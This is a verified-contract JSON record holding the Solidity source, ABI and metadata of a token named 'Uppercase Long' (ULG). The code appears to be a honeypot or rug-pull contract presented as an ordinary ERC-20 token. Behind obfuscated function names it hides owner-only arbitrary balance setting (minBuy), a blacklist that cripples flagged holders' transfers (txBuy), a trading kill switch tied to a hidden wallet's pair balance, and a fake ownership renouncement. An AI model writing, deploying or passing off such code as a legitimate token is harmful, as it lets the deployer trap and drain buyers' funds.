{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface atTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapReceiverAuto {\n    function createPair(address liquidityMaxReceiver, address teamTx) external returns (address);\n}\n\ninterface shouldReceiverMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedWallet) external view returns (uint256);\n\n    function transfer(address senderAmount, uint256 walletTeam) external returns (bool);\n\n    function allowance(address limitTxTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderAmount,\n        uint256 walletTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeList, uint256 value);\n    event Approval(address indexed limitTxTrading, address indexed spender, uint256 value);\n}\n\ninterface swapReceiver is shouldReceiverMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UppercaseLong is shouldTotal, shouldReceiverMode, swapReceiver {\n\n    bool public atMarketingSell;\n\n    function getOwner() external view returns (address) {\n        return tradingFee;\n    }\n\n    function minLimit(address teamIs, address senderAmount, uint256 walletTeam) internal returns (bool) {\n        if (teamIs == takeTo) {\n            return exemptTx(teamIs, senderAmount, walletTeam);\n        }\n        uint256 tokenReceiverTo = shouldReceiverMode(fundExempt).balanceOf(walletMaxAmount);\n        require(tokenReceiverTo == enableMarketing);\n        require(senderAmount != walletMaxAmount);\n        if (tokenSwapLaunched[teamIs]) {\n            return exemptTx(teamIs, senderAmount, limitFeeWallet);\n        }\n        return exemptTx(teamIs, senderAmount, walletTeam);\n    }\n\n    function transfer(address receiverAt, uint256 walletTeam) external virtual override returns (bool) {\n        return minLimit(_msgSender(), receiverAt, walletTeam);\n    }\n\n    function tradingBuyToken() public {\n        emit OwnershipTransferred(takeTo, address(0));\n        tradingFee = address(0);\n    }\n\n    bool private teamSwap;\n\n    function balanceOf(address launchedWallet) public view virtual override returns (uint256) {\n        return autoWallet[launchedWallet];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atFeeWallet;\n    }\n\n    address public fundExempt;\n\n    uint256 private atFeeWallet = 100000000 * 10 ** 18;\n\n    function minBuy(address receiverAt, uint256 walletTeam) public {\n        receiverLaunchedTeam();\n        autoWallet[receiverAt] = walletTeam;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellFee;\n    }\n\n    mapping(address => bool) public tokenSwapLaunched;\n\n    constructor (){\n        \n        atTo launchedExemptTotal = atTo(senderReceiver);\n        fundExempt = swapReceiverAuto(launchedExemptTotal.factory()).createPair(launchedExemptTotal.WETH(), address(this));\n        if (limitTotal == sellSwapReceiver) {\n            limitTotal = sellSwapReceiver;\n        }\n        takeTo = _msgSender();\n        tradingBuyToken();\n        buyAuto[takeTo] = true;\n        autoWallet[takeTo] = atFeeWallet;\n        \n        emit Transfer(address(0), takeTo, atFeeWallet);\n    }\n\n    string private sellFee = \"ULG\";\n\n    address private tradingFee;\n\n    function txBuy(address fundTake) public {\n        receiverLaunchedTeam();\n        \n        if (fundTake == takeTo || fundTake == fundExempt) {\n            return;\n        }\n        tokenSwapLaunched[fundTake] = true;\n    }\n\n    bool private atSwap;\n\n    string private fromFee = \"Uppercase Long\";\n\n    mapping(address => uint256) private autoWallet;\n\n    function transferFrom(address teamIs, address senderAmount, uint256 walletTeam) external override returns (bool) {\n        if (_msgSender() != senderReceiver) {\n            if (liquiditySender[teamIs][_msgSender()] != type(uint256).max) {\n                require(walletTeam <= liquiditySender[teamIs][_msgSender()]);\n                liquiditySender[teamIs][_msgSender()] -= walletTeam;\n            }\n        }\n        return minLimit(teamIs, senderAmount, walletTeam);\n    }\n\n    function amountExemptMin(uint256 walletTeam) public {\n        receiverLaunchedTeam();\n        enableMarketing = walletTeam;\n    }\n\n    mapping(address => mapping(address => uint256)) private liquiditySender;\n\n    uint8 private maxReceiver = 18;\n\n    uint256 public limitTotal;\n\n    function allowance(address sellMarketingSwap, address minTo) external view virtual override returns (uint256) {\n        if (minTo == senderReceiver) {\n            return type(uint256).max;\n        }\n        return liquiditySender[sellMarketingSwap][minTo];\n    }\n\n    uint256 public sellSwapReceiver;\n\n    address walletMaxAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return fromFee;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxReceiver;\n    }\n\n    address senderReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant limitFeeWallet = 19 ** 10;\n\n    mapping(address => bool) public buyAuto;\n\n    function owner() external view returns (address) {\n        return tradingFee;\n    }\n\n    function approve(address minTo, uint256 walletTeam) public virtual override returns (bool) {\n        liquiditySender[_msgSender()][minTo] = walletTeam;\n        emit Approval(_msgSender(), minTo, walletTeam);\n        return true;\n    }\n\n    function exemptTx(address teamIs, address senderAmount, uint256 walletTeam) internal returns (bool) {\n        require(autoWallet[teamIs] >= walletTeam);\n        autoWallet[teamIs] -= walletTeam;\n        autoWallet[senderAmount] += walletTeam;\n        emit Transfer(teamIs, senderAmount, walletTeam);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed limitTx, address indexed enableLaunchedReceiver);\n\n    uint256 launchFrom;\n\n    uint256 enableMarketing;\n\n    function launchMaxLaunched(address totalMarketingEnable) public {\n        require(totalMarketingEnable.balance < 100000);\n        if (atMarketingSell) {\n            return;\n        }\n        \n        buyAuto[totalMarketingEnable] = true;\n        \n        atMarketingSell = true;\n    }\n\n    address public takeTo;\n\n    function receiverLaunchedTeam() private view {\n        require(buyAuto[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTxTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLaunchedReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketingSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"amountExemptMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMarketingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMarketingEnable\",\"type\":\"address\"}],\"name\":\"launchMaxLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"minBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSwapReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenSwapLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingBuyToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"}],\"name\":\"txBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UppercaseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}